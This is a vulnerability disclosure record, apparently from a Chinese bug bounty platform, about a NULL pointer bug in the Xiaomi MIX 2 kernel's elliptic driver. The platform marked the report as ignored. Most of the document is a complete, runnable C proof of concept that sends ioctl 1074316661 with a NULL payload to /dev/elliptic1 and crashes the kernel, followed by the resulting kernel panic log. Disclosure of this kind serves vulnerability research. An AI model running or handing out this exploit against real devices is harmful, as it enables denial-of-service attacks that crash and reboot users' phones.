# 漏洞详情

漏洞标题:	小米MIX2内核elliptic驱动参数处理不当漏洞

漏洞类型:	智能硬件拒绝服务

危害等级:	严重

提交时间:	2018-05-04 16:24:34

处理进展:	已忽略

漏洞描述:	

## 一、详细说明：

​* A NULL pointer bug in the ioctl interface of device file /dev/elliptic1 or /dev/elliptic0 causes the system crash via IOCTL 1074316661.

漏洞证明:	
## 二、漏洞证明：
```
/*

* This is poc of XiaoMi MIX 2

* A NULL pointer bug in the ioctl interface of device file /dev/elliptic1 causes the system crash via IOCTL 1074316661 or 1074316661.

* This Poc should run with permission to do ioctl on /dev/elliptic1 or /dev/elliptic0.

*

* The fowllwing is kmsg of kernel crash infomation:

*

* [ 2118.946497] Unable to handle kernel NULL pointer dereference at virtual address 00000004

* [ 2118.946504] pgd = ffffffc148caf000

* [ 2118.946510] [00000004] *pgd=0000000174cc2003, *pud=0000000174cc2003, *pmd=0000000000000000

* [ 2118.946622] ------------[ cut here ]------------

* [ 2118.946627] Kernel BUG at ffffff80085ab954 [verbose debug info unavailable]

* [ 2118.946632] Internal error: Oops - BUG: 96000006 [#1] PREEMPT SMP

* [ 2118.946638] Modules linked in: wlan(O) exfat(O)

*

* [ 2118.947844] Process filter (pid: 8528, stack limit = 0xffffffc139a64020)

* [ 2118.947849] Call trace:

* [ 2118.947856] Exception stack(0xffffffc139a67c00 to 0xffffffc139a67d30)

* [ 2118.947863] 7c00: ffffffc17395b000 0000008000000000 ffffffc139a67dd0 ffffff80085ab954

* [ 2118.947870] 7c20: 000000000000000e ffffffc0b09ce400 ffffffc0b09cf000 ffffffc139a67d18

* [ 2118.947876] 7c40: ffffff800a98b2b0 ffffffc0b0045a08 ffffffc139a67c90 ffffff80082f7068

* [ 2118.947882] 7c60: ffffffc139a67c90 ffffff80082f7220 0000000000000001 ffffff8008570d00

* [ 2118.947888] 7c80: ffffffc139a67c90 ffffff8008570d24 ffffffc139a67dc0 ffffff80082fd618

* [ 2118.947895] 7ca0: 000000004008c575 000000004008c575 0000000000000000 0000000000000000

* [ 2118.947900] 7cc0: 000000004008c575 0000000000000000 0000004173d33000 0000000000323844

* [ 2118.947907] 7ce0: 000000000000001d ffffff80ffffffc8 0000000000000064 0000007ff40ce470

* [ 2118.947913] 7d00: 0000000000000000 ffffffffffffffff 0000000000495000 0000000000000008

* [ 2118.947918] 7d20: ffffff80081c7548 000000000000000f

* [ 2118.947926] [<ffffff80085ab954>] device_ioctl+0x6c/0x114

* [ 2118.947932] [<ffffff80081c7470>] do_vfs_ioctl+0x48c/0x564

* [ 2118.947938] [<ffffff80081c75a8>] SyS_ioctl+0x60/0x88

* [ 2118.947950] [<ffffff8008082730>] el0_svc_naked+0x24/0x28

* [ 2118.947958] Code: 97f76c12 91022260 94000240 14000027 (b9400442)

* [ 2118.947964] ---[ end trace 51f583adeda0aa94 ]---

* [ 2119.238089] Kernel panic - not syncing: Fatal exception

* [ 2119.238114] CPU0: stopping

*

*/

#include <stdio.h>

#include <fcntl.h>

#include <errno.h>

#include <sys/ioctl.h>

const static char *driver = "/dev/elliptic1"; // Or /dev/elliptic0

static command = 1074316661;

int main(int argc, char **argv, char **env) {

int fd = 0;

fd = open(driver, O_RDWR);

if (fd < 0) {

printf("Failed to open %s, with errno %d\n", driver, errno);

system("echo 1 > /data/local/tmp/log");

return -1;

}

printf("Try ioctl device file '%s', with command 0x%x and payload NULL\n", driver, command);

printf("System will crash and reboot.\n");

if(ioctl(fd, command, NULL) < 0) {

printf("Allocation of structs failed, %d\n", errno);

system("echo 2 > /data/local/tmp/log");

return -1;

}

close(fd);

return 0;

}
```
